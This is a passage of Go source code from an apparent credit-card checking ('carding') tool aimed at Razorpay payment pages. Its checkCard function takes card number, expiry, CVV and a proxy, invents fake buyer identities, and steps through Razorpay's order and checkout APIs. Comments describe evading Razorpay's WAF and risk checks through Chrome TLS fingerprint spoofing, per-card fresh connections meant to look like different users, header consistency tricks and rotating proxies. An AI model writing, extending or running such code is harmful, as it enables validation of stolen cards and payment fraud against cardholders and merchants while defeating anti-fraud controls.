	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return 0, fmt.Errorf("read failed: %w", err)
	}
	var data struct {
		Rates   map[string]float64 `json:"rates"`
		Message string             `json:"message"` // Frankfurter returns {"message":"not found"} for unsupported currencies
	}
	if err := json.Unmarshal(body, &data); err != nil {
		return 0, fmt.Errorf("parse failed: %w", err)
	}
	if data.Message != "" {
		return 0, fmt.Errorf("API message: %s", data.Message)
	}
	rate, ok := data.Rates[to]
	if !ok {
		return 0, fmt.Errorf("rate for %s not found", to)
	}
	if rate <= 0 {
		return 0, fmt.Errorf("invalid rate: %f", rate)
	}
	return rate, nil
}

// parseExchangeRateAPIResponse parses an exchangerate-api.com response.
func parseExchangeRateAPIResponse(resp *http.Response, to string) (float64, error) {
	if resp.StatusCode != 200 {
		return 0, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return 0, fmt.Errorf("read failed: %w", err)
	}
	var data struct {
		Rates map[string]float64 `json:"rates"`
	}
	if err := json.Unmarshal(body, &data); err != nil {
		return 0, fmt.Errorf("parse failed: %w", err)
	}
	rate, ok := data.Rates[to]
	if !ok {
		return 0, fmt.Errorf("rate for %s not found", to)
	}
	if rate <= 0 {
		return 0, fmt.Errorf("invalid rate: %f", rate)
	}
	return rate, nil
}

// parseOpenERAPIv6Response parses an open.er-api.com/v6 response.
// Response format: {"result":"success","base_code":"USD","rates":{"INR":83.12,...}}
func parseOpenERAPIv6Response(resp *http.Response, to string) (float64, error) {
	if resp.StatusCode != 200 {
		return 0, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return 0, fmt.Errorf("read failed: %w", err)
	}
	var data struct {
		Result string             `json:"result"`
		Rates  map[string]float64 `json:"rates"`
	}
	if err := json.Unmarshal(body, &data); err != nil {
		return 0, fmt.Errorf("parse failed: %w", err)
	}
	if data.Result != "success" {
		return 0, fmt.Errorf("API returned result=%q", data.Result)
	}
	rate, ok := data.Rates[to]
	if !ok {
		return 0, fmt.Errorf("rate for %s not found", to)
	}
	if rate <= 0 {
		return 0, fmt.Errorf("invalid rate: %f", rate)
	}
	return rate, nil
}

// extractSiteCurrency searches the initData map (recursively) for a "currency"
// field. This lets us detect what currency the Razorpay payment link is
// configured for, so we can convert the user's amount if needed.
func extractSiteCurrency(initData map[string]interface{}) string {
	if initData == nil {
		return ""
	}
	return findCurrencyRecursive(initData, 0)
}

// findCurrencyRecursive searches a map for a "currency" string field, up to
// a max depth of 5 to avoid infinite recursion on cyclic structures.
func findCurrencyRecursive(m map[string]interface{}, depth int) string {
	if depth > 5 {
		return ""
	}
	// Direct key match
	if cur, ok := m["currency"].(string); ok && cur != "" {
		return strings.ToUpper(strings.TrimSpace(cur))
	}
	// Search nested maps
	for _, v := range m {
		if nested, ok := v.(map[string]interface{}); ok {
			if cur := findCurrencyRecursive(nested, depth+1); cur != "" {
				return cur
			}
		}
	}
	return ""
}

type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

func (r *FetchResponse) Text() string {
	return r.Body
}

type CustomFetch struct {
	client  *http.Client
	ua      string
	secChUA string
	// reqID is a short hex tag assigned at construction time. Every
	// DoFetch() call by this instance is logged under this tag when
	// DEBUG=1, so logs from one checkCard call stay grouped.
	reqID string
}

// NewCustomFetch builds a fetch client. The same Chrome major version is
// used for BOTH the User-Agent string and the Sec-CH-UA header — generating
// them independently (as the previous code did) produced mismatched versions
// (e.g. UA=Chrome 145, Sec-CH-UA=Chrome 121) which is a trivial WAF
// fingerprinting signal.
//
// If a non-empty `ua` is passed in, we try to parse the Chrome major out of
// it so the Sec-CH-UA header stays consistent. If parsing fails (e.g. the UA
// isn't a Chrome UA), we fall back to picking a fresh random major.
//
// IMPORTANT: We create a NEW transport per call (NOT shared/cached). Sharing
// transports causes the WAF to detect connection reuse across multiple card
// checks and decline all subsequent requests. Each check gets its own fresh
// TCP/TLS connection, which looks like organic traffic from different users.
func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*CustomFetch, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	// 2026-07-16: Use uTLS to mimic Chrome's TLS fingerprint (JA3).
	// Go's default TLS client has a distinct fingerprint that Razorpay's
	// WAF detects, returning a smaller/blocked HTML page (1488 bytes
	// instead of 8815) and then declining every payment with
	// payment_risk_check_failed. uTLS makes our TLS handshake look like
	// real Chrome, bypassing JA3-based detection.
	//
	// We use a custom DialTLS that wraps the proxy dial + uTLS handshake.
	// The HTTP transport handles HTTP/1.1 framing on top of our uTLS conn.
	dialTLS := func(network, addr string) (net.Conn, error) {
		// 1. Open a TCP connection (directly or via proxy).
		var rawConn net.Conn
		var derr error
		if proxyParsedURL != nil {
			// CONNECT proxy: open TCP to proxy, then CONNECT to target.
			proxyAddr := proxyParsedURL.Host
			rawConn, derr = net.DialTimeout("tcp", proxyAddr, 15*time.Second)
			if derr != nil {
				return nil, fmt.Errorf("proxy dial: %w", derr)
			}
			// If proxy has auth, add Proxy-Authorization header.
			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
			if proxyParsedURL.User != nil {
				// Encode user:pass as base64 for Basic auth.
				user := proxyParsedURL.User.Username()
				pass, _ := proxyParsedURL.User.Password()
				creds := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
				connectReq += "Proxy-Authorization: Basic " + creds + "\r\n"
			}
			connectReq += "\r\n"
			_, derr = rawConn.Write([]byte(connectReq))
			if derr != nil {
				rawConn.Close()
				return nil, fmt.Errorf("proxy CONNECT write: %w", derr)
			}
			// Read the CONNECT response (expect 200 Connection established).
			buf := make([]byte, 1024)
			n, derr := rawConn.Read(buf)
			if derr != nil {
				rawConn.Close()
				return nil, fmt.Errorf("proxy CONNECT read: %w", derr)
			}
			resp := string(buf[:n])
			if !strings.Contains(resp, " 200 ") {
				rawConn.Close()
				return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.Split(resp, "\r\n")[0])
			}
		} else {
			rawConn, derr = net.DialTimeout(network, addr, 15*time.Second)
			if derr != nil {
				return nil, fmt.Errorf("dial: %w", derr)
			}
		}

		// 2. Wrap with uTLS using Chrome fingerprint.
		host, _, _ := net.SplitHostPort(addr)
		uConn := utls.UClient(rawConn, &utls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
		}, utls.HelloChrome_Auto)

		// 3. Perform the TLS handshake with Chrome's fingerprint.
		if herr := uConn.Handshake(); herr != nil {
			rawConn.Close()
			return nil, fmt.Errorf("uTLS handshake: %w", herr)
		}
		return uConn, nil
	}

	transport := &http.Transport{
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   50,
		MaxConnsPerHost:       100,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		TLSHandshakeTimeout:   15 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		DialTLS:               dialTLS,
		// For plain HTTP (non-TLS) requests, use normal dial (with proxy).
		Proxy: http.ProxyFromEnvironment,
	}
	if proxyParsedURL != nil {
		transport.Proxy = http.ProxyURL(proxyParsedURL)
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}

	// Pick ONE Chrome major for the whole life of this fetch client.
	// If the caller passed a UA, parse the major out of it so the
	// Sec-CH-UA header matches. Otherwise generate a fresh UA.
	chromeMajor := -1
	if ua != "" {
		chromeMajor = parseChromeMajor(ua)
	}
	if chromeMajor < 0 {
		chromeMajor = randInt(135, 150)
	}
	if ua == "" {
		ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
			chromeMajor, randInt(5000, 6999), randInt(50, 249))
	}
	// Sec-CH-UA brand token rotates with Chrome major version (major%3).
	// Static "Not_A Brand" for every version is a WAF fingerprinting signal.
	var garbageBrand string
	switch chromeMajor % 3 {
	case 0:
		garbageBrand = "Not_A Brand"
	case 1:
		garbageBrand = "Not.A/Brand"
	default:
		garbageBrand = "Not;A Brand"
	}
	secChUA := fmt.Sprintf(`"%s";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, garbageBrand, chromeMajor, chromeMajor)

	return &CustomFetch{client: client, ua: ua, secChUA: secChUA, reqID: nextDebugReqID()}, nil
}

// parseChromeMajor extracts the Chrome major version from a User-Agent
// string like "Mozilla/5.0 ... Chrome/145.0.6999.123 ...". Returns -1 if
// the version can't be found.
var chromeMajorRe = regexp.MustCompile(`Chrome/(\d+)\.`)

func parseChromeMajor(ua string) int {
	m := chromeMajorRe.FindStringSubmatch(ua)
	if len(m) < 2 {
		return -1
	}
	n, err := strconv.Atoi(m[1])
	if err != nil {
		return -1
	}
	return n
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	var reqBody io.Reader = body
	if reqBody == nil && method == "POST" {
		reqBody = strings.NewReader("")
	}

	// Capture the request body for debug logging (the caller-supplied
	// reader is consumed by http.NewRequest below, so we must read it
	// first if we want to log it).
	var reqBodyBytes []byte
	if debugEnabled && reqBody != nil {
		reqBodyBytes, _ = io.ReadAll(reqBody)
		reqBody = strings.NewReader(string(reqBodyBytes))
	}

	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	// Always set standard browser headers first
	req.Header.Set("User-Agent", f.ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Language", generateAcceptLanguage())
	// NOTE: We advertise gzip+deflate (not br — Go stdlib has no brotli
	// decoder). We MUST decompress manually below because Go's Transport
	// only auto-decompresses gzip when Accept-Encoding was NOT set by the
	// caller. Setting it ourselves = our responsibility to decode.
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Ch-Ua", f.secChUA)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	// Debug: log the outgoing request (after all headers are merged).
	if debugEnabled {
		dbgRequest(f.reqID, "HTTP", method, targetURL, req.Header, reqBodyBytes)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		if debugEnabled {
			dbgWrite(fmt.Sprintf("[%s] HTTP ✗ error: %v", f.reqID, err))
		}
		return nil, err
	}
	defer resp.Body.Close()

	limitedBody := io.LimitReader(resp.Body, 10<<20)
	respBody, err := io.ReadAll(limitedBody)
	if err != nil {
		return nil, err
	}

	// Manually decode the body if the server used a compression we
	// advertised. Go's Transport does NOT do this when Accept-Encoding
	// was set explicitly (which it was, above).
	switch strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding"))) {
	case "gzip":
		gr, gerr := gzip.NewReader(bytes.NewReader(respBody))
		if gerr != nil {
			return nil, fmt.Errorf("gzip decode: %w", gerr)
		}
		defer gr.Close()
		if decoded, derr := io.ReadAll(io.LimitReader(gr, 10<<20)); derr == nil {
			respBody = decoded
		}
	case "deflate":
		fr := flate.NewReader(bytes.NewReader(respBody))
		defer fr.Close()
		if decoded, derr := io.ReadAll(io.LimitReader(fr, 10<<20)); derr == nil {
			respBody = decoded
		}
	}

	// Debug: log the response (after decompression).
	if debugEnabled {
		dbgResponse(f.reqID, "HTTP", resp.StatusCode, resp.Header, respBody)
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/json"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/x-www-form-urlencoded"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

type CheckResult struct {
	Status      string `json:"status"`
	Message     string `json:"response"`
	Proxy       string `json:"proxy"`
	ProxyStatus string `json:"proxy_status"`
	// Amount & Currency reflect the ACTUAL amount charged (after currency
	// conversion if the site's currency differs from what the user requested).
	// `Amount` is in MAJOR units in the site's currency (e.g. 415.00 = ₹415).
	Amount   float64 `json:"amount"`
	Currency string  `json:"currency"`
	// RequestedAmount & RequestedCurrency echo back what the USER asked for
	// (before conversion). When no conversion happened, these match Amount/
	// Currency. When conversion happened, the user can see both values.
	RequestedAmount   float64 `json:"requested_amount"`
	RequestedCurrency string  `json:"requested_currency"`
	// ExchangeRate is the rate used for conversion (1 requested_currency =
	// X site_currency). 0 when no conversion was needed.
	ExchangeRate float64 `json:"exchange_rate"`
}

// zeroDecimalCurrencies lists ISO 4217 currency codes whose smallest unit is
// the major unit itself (no subdivision). For these currencies the Razorpay
// API expects the amount in whole units (e.g. 1 JPY = 1, not 100). Any
// currency NOT in this set is treated as a 2-decimal currency (INR, USD, EUR,
// GBP, …) where the API expects the amount in the smallest subdivision
// (paise / cents).
var zeroDecimalCurrencies = map[string]bool{
	"JPY": true, // Japanese Yen
	"KRW": true, // South Korean Won
	"VND": true, // Vietnamese Dong
	"CLP": true, // Chilean Peso
	"ISK": true, // Icelandic Króna
	"PYG": true, // Paraguayan Guaraní
	"UGX": true, // Ugandan Shilling
	"RWF": true, // Rwandan Franc
	"BIF": true, // Burundian Franc
	"DJF": true, // Djiboutian Franc
	"GNF": true, // Guinean Franc
	"KMF": true, // Comorian Franc
	"XAF": true, // Central African CFA Franc
	"XOF": true, // West African CFA Franc
	"XPF": true, // CFP Franc
}

// toSmallestUnit converts a major-unit amount (e.g. ₹1.50, $5.00) into the
// smallest currency unit Razorpay expects (paise / cents for 2-decimal
// currencies, whole units for zero-decimal currencies). The result is rounded
// to the nearest integer to avoid floating-point drift (e.g. 1.15 * 100 =
// 114.99999…  → 115).
func toSmallestUnit(amount float64, currency string) int64 {
	if zeroDecimalCurrencies[strings.ToUpper(currency)] {
		return int64(math.Round(amount))
	}
	return int64(math.Round(amount * 100))
}

func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amountINR float64, currency string) (result CheckResult) {
	// defer runs AFTER every return path (including early error returns),
	// so we use it to attach the user-supplied amount/currency to the
	// response. This means EVERY CheckResult the caller ever sees —
	// success, decline, WAF block, proxy error, parse failure — will
	// include the amount & currency that were attempted, even if the
	// Razorpay flow never got far enough to send them.
	//
	// We resolve the FINAL values here so they match what the body of the
	// function actually used (default ₹1.00 INR if caller passed 0/empty).
	resolvedAmount := amountINR
	if resolvedAmount <= 0 {
		resolvedAmount = defaultAmount
	}
	resolvedCurrency := strings.ToUpper(strings.TrimSpace(currency))
	if resolvedCurrency == "" {
		resolvedCurrency = defaultCurrency
	}
	// These track the user's ORIGINAL request (before any currency conversion).
	// They're set once and never changed, so the response always shows what
	// the user asked for in addition to what was actually charged.
	requestedAmount := resolvedAmount
	requestedCurrency := resolvedCurrency
	exchangeRateUsed := 0.0

	defer func() {
		result.Amount = resolvedAmount
		result.Currency = resolvedCurrency
		result.RequestedAmount = requestedAmount
		result.RequestedCurrency = requestedCurrency
		result.ExchangeRate = exchangeRateUsed
	}()

	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	year, _ := strconv.Atoi("20" + yy2)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()
	fullName := genName()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	var proxyRaw string
	var proxyParsedURL *url.URL
	if pp != nil {
		proxyRaw = pp.raw
		proxyParsedURL = pp.parsed
	}
	fetch, err := NewCustomFetch(proxyParsedURL, ua, proxyRaw)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyRaw, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

	// Debug: announce the start of a new check-card flow.
	if debugEnabled {
		dbgSection(fetch.reqID, fmt.Sprintf("checkCard  cc=%s|%s|%s|***  amount=%.2f %s  proxy=%s",
			maskCard(cc), mm, yy, amountINR, currency, extractProxyHost(proxyRaw)))
		dbgWrite(fmt.Sprintf("[%s] UA: %s", fetch.reqID, ua))
	}

	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 1: resolveRazorpayInitData")
		dbgWrite(fmt.Sprintf("[%s] target URL: %s", fetch.reqID, targetURL))
	}
	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
	if resolveErr != nil {
		// resolvedURL carries the proxy-status classification
		// ("BLOCKED", "DEAD", "LIVE", or "" if unknown).
		proxyStatus := resolvedURL
		if proxyStatus == "" {
			proxyStatus = "LIVE"
		}
		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
		if proxyStatus == "DEAD" {
			markProxyDead(proxyRaw)
		}
		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: proxyStatus}
	}
	_ = resolvedURL

	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if kyid == "" {
		if opts, ok := initData["options"].(map[string]interface{}); ok {
			kyid = getStringFromMap(opts, "key")
			if kyid == "" {
				kyid = getStringFromMap(opts, "key_id")
			}
		}
	}
	if kyid == "" {
		kyid = getStringFromMap(initData, "merchant_key")
	}
	// ── 2026-07-16: Allow empty key_id for keyless checkout flow ──────────
	// Modern Razorpay payment pages intentionally expose `"key_id": null`
	// in their public page data (see var data = {...} on any pages.razorpay.com
	// page). Authentication for the standard_checkout API is done via the
	// `keyless_header` query parameter, which is a server-signed token that
	// does NOT require a key_id. The previous code returned an early
	// "Key ID not found" error here, which meant EVERY modern page would
	// fail at this point. We now allow an empty key_id as long as the
	// keyless_header is present (it's checked again downstream when the
	// payment URL is built, but failing early with a clear message is
	// friendlier than letting the request hit Razorpay and getting back
	// BAD_REQUEST_ERROR).
	if kyid == "" {
		if kh := getStringFromMap(initData, "keyless_header"); kh == "" {
			keys := make([]string, 0, len(initData))
			for k := range initData {
				keys = append(keys, k)
			}
			return CheckResult{Status: "error", Message: "Key ID not found AND keyless_header missing. Keys: " + strings.Join(keys, ","), Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		// keyless_header is present — proceed with empty kyid.
		// Downstream code MUST conditionally add key_id to form bodies /
		// URLs (only include when non-empty), otherwise it will send
		// `key_id=` which Razorpay rejects with BAD_REQUEST_ERROR.
		if debugEnabled {
			dbgWrite(fmt.Sprintf("[%s] key_id is empty — using KEYLESS flow (keyless_header present)", fetch.reqID))
		}
	}

	var plink, ppid string

	// ── Custom amount + currency conversion ──────────────────────────────
	// `amountINR` is the amount in MAJOR units (e.g. 1.0 = ₹1, 5.5 = ₹5.50).
	// Razorpay's API expects the smallest currency unit (paise for INR,
	// cents for USD/EUR). We convert here ONCE and reuse `forceAmount`
	// everywhere downstream so the order, checkout form, cross-border call,
	// and payment-create form all see the same value.
	//
	// CURRENCY CONVERSION: Razorpay payment links are currency-locked —
	// the order inherits the link's currency regardless of what the user
	// requested. If the user selects USD but the site is INR, we convert
	// the user's amount to the site's currency at the current exchange rate
	// BEFORE creating the order. E.g. $5 USD → ₹415 INR (at 1 USD = 83 INR).
	//
	// Default: ₹1.00 (100 paise) — matches the historical behaviour so
	// existing callers that don't pass `amount` keep working unchanged.
	if amountINR <= 0 {
		amountINR = 1.0
	}
	if strings.TrimSpace(currency) == "" {
		currency = "INR"
	}
	currency = strings.ToUpper(strings.TrimSpace(currency))

	// Detect the site's currency from the page data. This lets us convert
	// the user's amount BEFORE creating the order (so the order is created
	// with the correct converted amount).
	siteCurrency := extractSiteCurrency(initData)
	if siteCurrency != "" && siteCurrency != currency {
		// User's currency differs from the site's currency → convert
		rate, convErr := getExchangeRate(currency, siteCurrency)
		if convErr != nil {
			log.Printf("[currency-convert] %s→%s failed: %v — falling back to no conversion", currency, siteCurrency, convErr)
			// Fall back: use the user's amount as-is (will be charged in site currency)
			// This may result in a smaller charge than expected but won't error
		} else {
			convertedAmount := amountINR * rate
			log.Printf("[currency-convert] %s %.2f → %s %.2f (rate: %.4f)",
				currency, amountINR, siteCurrency, convertedAmount, rate)
			// Update resolvedAmount/resolvedCurrency to the converted values
			// so the response shows the ACTUAL charged amount.
			resolvedAmount = convertedAmount
			resolvedCurrency = siteCurrency
			amountINR = convertedAmount
			currency = siteCurrency
			exchangeRateUsed = rate
		}
	} else if siteCurrency != "" && siteCurrency == currency {
		// Same currency — no conversion needed, but update resolvedCurrency
		// to match the site's currency (defensive).
		resolvedCurrency = siteCurrency
	}

	forceAmount := math.Round(amountINR * 100) // ×100 for 2-decimal currencies
	if forceAmount < 1 {
		forceAmount = 100 // safety net — never send 0 to Razorpay
	}

	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}

	if plink == "" {
		return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")
	keylessHeaderURL := url.QueryEscape(keylessHeader)

	// Step 2: Create order
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 2: create order")
	}
	r2Payload := map[string]interface{}{
		"notes": map[string]string{"comment": "", "name": fullName},
	}
	if ppid != "" {
		r2Payload["line_items"] = []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}}
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", url.PathEscape(plink)),
		map[string]string{
			"Accept":         "application/json, text/plain, */*",
			"Content-Type":   "application/json",
			"Origin":         "https://pages.razorpay.com",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "empty",
			"Sec-Fetch-Mode": "cors",
			"Sec-Fetch-Site": "same-site",
		},
		r2Payload,
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	// Check for WAF block on order creation
	if r2.StatusCode == 403 || r2.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on order creation (HTTP %d)", r2.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		errMsg := "Order creation failed"
		if e, ok := r2Data["error"].(map[string]interface{}); ok {
			desc := getStringFromMap(e, "description")
			if desc != "" {
				errMsg = desc
			}
		}
		return CheckResult{Status: "error", Message: errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}

	// `orderAmount` is the amount we send to Razorpay in EVERY subsequent
	// call (preferences, checkout form, cross-border, payment create).
	// The user-supplied `forceAmount` (derived from `amountINR` + `currency`)
	// ALWAYS wins — this is what makes the custom-charge feature work. We
	// only fall back to the order-response amount if the caller somehow
	// bypassed the constructor defaults (defensive).
	orderAmount := getFloatFromMap(orderObj, "amount")
	if forceAmount > 0 {
		orderAmount = forceAmount
	} else if orderAmount < 100 {
		orderAmount = 100
	}

	// `orderCurrency` MUST come from the order response, NOT from the
	// user's input. Razorpay payment links are currency-locked — when you
	// create an order against a payment link, the order inherits the link's
	// currency (usually INR). You CANNOT change it.
	orderCurrency := strings.ToUpper(strings.TrimSpace(getStringFromMap(orderObj, "currency")))
	if orderCurrency == "" {
		orderCurrency = "INR"
	}

	// If we didn't detect the site currency earlier (siteCurrency was empty)
	// and thus didn't do conversion, update resolvedCurrency from the order
	// response now. If we DID do conversion, resolvedCurrency is already
	// correct (set during the conversion step above).
	if exchangeRateUsed == 0 {
		// No conversion happened — use the order's actual currency
		resolvedCurrency = orderCurrency
	}
	// If conversion happened, verify the order's currency matches what we
	// expected. If not, log a warning (shouldn't happen in practice).
	if exchangeRateUsed > 0 && orderCurrency != resolvedCurrency {
		log.Printf("[currency-convert] WARNING: order currency %s != expected %s after conversion",
			orderCurrency, resolvedCurrency)
		resolvedCurrency = orderCurrency
	}

	// Step 3: Get checkout session
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 3: get checkout session (sessid)")
	}
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":         "text/html,application/xhtml+xml,*/*",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "document",
			"Sec-Fetch-Mode": "navigate",
			"Sec-Fetch-Site": "same-site",
		},
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	if r3.StatusCode == 403 || r3.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on checkout public (HTTP %d)", r3.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	r3Text := r3.Text()

	sessid := findBetween(r3Text, `window.session_token="`, `";`)
	if sessid == "" {
		m := sessionTokenRe.FindStringSubmatch(r3Text)
		if len(m) >= 2 {
			sessid = m[1]
		}
	}
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
			"Sec-Fetch-Dest":  "empty",
			"Sec-Fetch-Mode":  "cors",
			"Sec-Fetch-Site":  "same-origin",
		}
	}

	// Step 4: Preferences call
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 4: preferences")
	}
	{
		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config"}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}

		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmount,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		r4, r4err := fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
			h, r4Payload,
		)
		if r4err != nil {
			log.Printf("step 4 (preferences): error: %v", r4err)
		} else if r4.StatusCode >= 400 {
			log.Printf("step 4 (preferences): HTTP %d", r4.StatusCode)
		}
	}

	// Step 5: Checkout order form
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 5: checkout order")
	}
	{
		form5 := url.Values{
